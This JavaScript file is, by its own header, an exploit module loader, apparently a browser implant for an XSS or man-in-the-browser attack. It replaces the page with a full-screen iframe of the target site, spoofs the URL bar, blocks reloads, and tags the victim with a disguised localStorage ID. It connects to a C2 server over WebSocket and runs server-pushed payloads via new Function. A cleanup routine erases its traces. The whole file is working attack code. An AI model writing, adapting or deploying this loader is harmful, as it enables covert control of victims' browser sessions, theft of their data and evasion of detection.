/* Exploit module loader. Frames the target page in an iframe, connects to the C2 server via WebSocket, and dynamically loads payload modules. */
import { encodeBinaryFrame, decodeBinaryFrame } from "../shared/binary-frame.js";

(function () {
  // Bail out if running inside our own iframe
  if (window !== window.top) return;

  const serverUrl =
    typeof __DV_SERVER__ !== "undefined"
      ? __DV_SERVER__
      : `ws://${location.hostname}:3001/ws`;

  const linkId =
    typeof __DV_LINK_ID__ !== "undefined" ? __DV_LINK_ID__ : null;

  // Generate a UUID (crypto.randomUUID preferred, Math.random fallback for older browsers)
  function generateUUID() {
    try {
      return crypto.randomUUID();
    } catch (_) {}
    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
      const r = (Math.random() * 16) | 0;
      return (c === "x" ? r : (r & 0x3) | 0x8).toString(16);
    });
  }

  /**
   * Returns a persistent client ID stored in localStorage under "perf_id".
   * Falls back to an ephemeral UUID if localStorage is unavailable.
   * @returns {string}
   */
  function getOrCreateClientId() {
    const KEY = "perf_id";
    try {
      const existing = localStorage.getItem(KEY);
      if (existing) return existing;
      const id = generateUUID();
      localStorage.setItem(KEY, id);
      return id;
    } catch (_) {
      // localStorage unavailable (e.g. private mode restrictions)
      return generateUUID();
    }
  }

  const clientId = getOrCreateClientId();

  // True after the first successful WS open event — used to mark subsequent connections as reconnects
  let hasConnectedOnce = false;
  const loadedPayloads = new Map(); // name → { module, api }
  const messageHandlers = new Map(); // name → Map(type → [handlers])

  // Mutable WS reference — replaced on each reconnect
  let ws = null;

  // When true, the loader has been destroyed and must not reconnect
  let destroyed = false;

  // Send a diagnostic log to the server
  function sendLog(level, source, message) {
    if (!ws || ws.readyState !== WebSocket.OPEN) return;
    ws.send(JSON.stringify({
      type: "log",
      level,
      source,
      message,
      timestamp: Date.now(),
    }));
  }

  // Save current URL, then replace page with iframe
  const targetUrl =
    typeof __DV_REDIRECT__ !== "undefined" && __DV_REDIRECT__
      ? __DV_REDIRECT__
      : location.origin;

  document.head.innerHTML = "";
  document.body.innerHTML = "";

  const iframe = document.createElement("iframe");
  iframe.style.cssText =
    "position:fixed;top:0;left:0;width:100%;height:100%;border:none;margin:0;padding:0;z-index:2147483647";
  document.body.style.cssText = "margin:0;padding:0;overflow:hidden";
  document.body.appendChild(iframe);

  iframe.src = targetUrl;

  function isCrossOrigin(url) {
    try {
      return (
        new URL(url, iframe.contentWindow.location.href).origin !==
        iframe.contentWindow.location.origin
      );
    } catch (_) {
      return true;
    }
  }
  // Update URL bar
  try {
    history.replaceState(null, "", targetUrl);
  } catch (_) {}

  // Intercept cross-origin link clicks
  iframe.onload = () => {
    let doc;
    try {
      doc = iframe.contentDocument;
    } catch (_) {
      return; // cross-origin navigation — can't attach click interceptor
    }
    if (!doc?.documentElement) return;
    doc.documentElement.addEventListener("click", (e) => {
      const anchor = e.target.closest("a[href]");
      if (!anchor) return;
      if (isCrossOrigin(anchor.href)) {
        e.preventDefault();
        window.open(anchor.href, "_blank");
      }
    });
  };

  // Slow down / prevent reloads
  function onBeforeUnload(e) {
    sendLog("warn", "loader", "Unload attempt detected, delaying with popup");
    e.preventDefault();
    e.returnValue = ''; // the exact string is ignored by modern browsers
  }
  window.addEventListener('beforeunload', onBeforeUnload);

  // no-op reload override - could help prevent app scripts from reloading
  location.reload = function () {
    sendLog("warn", "loader", "Reload prevented from unknown source");
  };

  function onKeyDown(e) {
    // F5, Ctrl+R / Cmd+R
    if ((e.key === 'F5') || ((e.ctrlKey || e.metaKey) && (e.key === 'r' || e.key === 'R'))) {
      e.preventDefault();
      sendLog("info", "loader", "Reload prevented from keyboard shortcut");
      iframe.src = targetUrl;
    }
  }
  window.addEventListener('keydown', onKeyDown);

  // Handle browser back/forward
  function onPopState() {
    if (iframe) iframe.src = location.href;
  }
  window.addEventListener("popstate", onPopState);

  /**
   * Build the payload API context passed to each payload module's `init()` function.
   * Provides iframe access, typed send functions, a message subscription helper, and logging.
   *
   * Two send functions are provided to make intent explicit for payload authors:
   *   send(type, data)  — structured text messages only; `type` becomes `data.type` on the wire
   *   sendBinary(data)  — raw binary frames only; `data` must be Uint8Array or ArrayBuffer
   *
   * @param {string} name - The payload name (e.g. "domviewer", "spider").
   * @returns {{ iframe, clientId, baseUrl, log, send, sendBinary, on }}
   */
  function makePayloadAPI(name) {
    return {
      iframe,
      clientId,
      baseUrl: targetUrl,
      log(level, message) {
        sendLog(level, name, message);
      },
      /** Send a structured text message to the server for this payload. */
      send(type, data) {
        if (!ws || ws.readyState !== WebSocket.OPEN) return;
        ws.send(JSON.stringify({ type: "payload", name, data: { type, ...data } }));
      },
      /** Send a raw binary frame to the server for this payload. */
      sendBinary(data) {
        if (!ws || ws.readyState !== WebSocket.OPEN) return;
        const dataBytes = data instanceof Uint8Array ? data : new Uint8Array(data);
        ws.send(encodeBinaryFrame(name, dataBytes));
      },
      on(type, handler) {
        if (!messageHandlers.has(name)) messageHandlers.set(name, new Map());
        const handlers = messageHandlers.get(name);
        if (!handlers.has(type)) handlers.set(type, []);
        handlers.get(type).push(handler);
      },
    };
  }

  /**
   * Dispatch a server-pushed payload message to all registered handlers for the given type.
   * @param {string} name - Payload name.
   * @param {string} type - Message type from the payload data.
   * @param {object} data - Full data object from the message.
   */
  function dispatchToPayload(name, type, data) {
    const handlers = messageHandlers.get(name);
    if (!handlers) return;
    const fns = handlers.get(type);
    if (fns) fns.forEach((fn) => fn(data));
  }

  /**
   * Execute a payload bundle and call its `init()` function with the API context.
   * Skips silently if the payload is already loaded (server re-sends on reconnect).
   * @param {string} name - Payload name.
   * @param {string} code - IIFE bundle source from the server.
   * @param {object} [config] - Per-payload config object from the load message.
   */
  function loadPayloadCode(name, code, config) {
    // Skip if already loaded — server re-sends on reconnect
    if (loadedPayloads.has(name)) return;
    try {
      // Execute the IIFE bundle via new Function to get the __payload__ export
      const fn = new Function(code + "\nreturn typeof __payload__ !== 'undefined' ? __payload__ : undefined;");
      const mod = fn();
      if (!mod || typeof mod.init !== "function") {
        sendLog("error", "loader", `Payload "${name}" has no init function`);
        return;
      }
      const api = makePayloadAPI(name);
      loadedPayloads.set(name, { module: mod, api });
      // Pass per-payload config from the load message (defaults to empty object)
      mod.init({ ...api, config: config || {} });
      // Acknowledge load
      if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: "loaded", name }));
      }
      sendLog("info", "loader", `Payload "${name}" loaded`);
    } catch (err) {
      sendLog("error", "loader", `Failed to load payload "${name}": ${err.message}`);
    }
  }

  function unloadPayload(name) {
    const entry = loadedPayloads.get(name);
    if (!entry) return;
    if (typeof entry.module.destroy === "function") {
      try { entry.module.destroy(); } catch (e) { sendLog("error", "loader", `Error destroying "${name}": ${e.message}`); }
    }
    loadedPayloads.delete(name);
    messageHandlers.delete(name);
    sendLog("info", "loader", `Payload "${name}" unloaded`);
  }

  /**
   * Full cleanup: unload all payloads, remove event listeners, close WS,
   * erase the persistent client ID, remove the iframe, and navigate back
   * to the target URL — leaving no trace of the loader.
   */
  function destroy() {
    destroyed = true;

    // Cancel any pending reconnect
    if (reconnectTimer) {
      clearTimeout(reconnectTimer);
      reconnectTimer = null;
    }

    // Unload all payloads (triggers their destroy() hooks)
    for (const name of [...loadedPayloads.keys()]) {
      unloadPayload(name);
    }

    // Close the WebSocket
    try { if (ws) ws.close(); } catch (_) {}

    // Remove the persistent client ID so the next visit gets a fresh identity
    try { localStorage.removeItem("perf_id"); } catch (_) {}

    // Remove event listeners
    window.removeEventListener("beforeunload", onBeforeUnload);
    window.removeEventListener("keydown", onKeyDown);
    window.removeEventListener("popstate", onPopState);

    // Remove the iframe from the DOM
    if (iframe.parentNode) iframe.parentNode.removeChild(iframe);

    // Navigate to targetUrl — discards the JS context and returns the user to the original page
    window.location.replace(targetUrl);
  }

  // WebSocket reconnection with exponential backoff
  let reconnectDelay = 1000;
  const MAX_RECONNECT_DELAY = 30000;
  let reconnectTimer = null;

  /**
   * Open the WebSocket connection to the C2 server and register all event handlers.
   * Called initially and on each reconnect attempt.
   */
  function connect() {
    ws = new WebSocket(serverUrl);
    ws.binaryType = "arraybuffer";

    ws.addEventListener("open", () => {
      // Reset backoff on successful connection
      reconnectDelay = 1000;
      // reconnect=true only when the WS has dropped and re-opened within the same page
      // session. The server uses this flag to detect clients that were deleted by the
      // operator while offline and send them a destroy. On the first open of a page session
      // we never set reconnect=true — even if localStorage has a stored ID — so that
      // insertClient (INSERT OR IGNORE) can safely re-register the client if the server DB
      // has no record of it (e.g. fresh deployment or DB reset).
      const reconnect = hasConnectedOnce;
      hasConnectedOnce = true;
      ws.send(JSON.stringify({ type: "init", clientId, linkId, reconnect, origin: window.location.origin }));
      sendLog("info", "loader", "WebSocket connected, handshake sent");
    });

    ws.addEventListener("message", (e) => {
      if (typeof e.data === "string") {
        let msg;
        try { msg = JSON.parse(e.data); } catch { return; }

        if (msg.type === "load") {
          loadPayloadCode(msg.name, msg.code, msg.config);
        } else if (msg.type === "unload") {
          unloadPayload(msg.name);
        } else if (msg.type === "payload") {
          dispatchToPayload(msg.name, msg.data?.type, msg.data);
        } else if (msg.type === "destroy") {
          // Server has requested full teardown — clean up and navigate away
          destroy();
        }
      } else {
        // Binary message — decode the name prefix using the shared utility
        const frame = decodeBinaryFrame(e.data);
        if (!frame) return;
        dispatchToPayload(frame.name, "binary", frame.data);
      }
    });

    ws.addEventListener("close", () => {
      scheduleReconnect();
    });

    ws.addEventListener("error", () => {
      // The 'close' event fires after 'error', so reconnect is handled there
    });
  }

  /**
   * Schedule a reconnection attempt after the current backoff delay.
   * Doubles the delay on each call, capped at MAX_RECONNECT_DELAY.
   * No-ops if the loader has been destroyed or a reconnect is already pending.
   */
  function scheduleReconnect() {
    // Do not reconnect if the loader has been destroyed
    if (destroyed) return;
    if (reconnectTimer) return;
    reconnectTimer = setTimeout(() => {
      reconnectTimer = null;
      connect();
    }, reconnectDelay);
    reconnectDelay = Math.min(reconnectDelay * 2, MAX_RECONNECT_DELAY);
  }

  connect();
})();
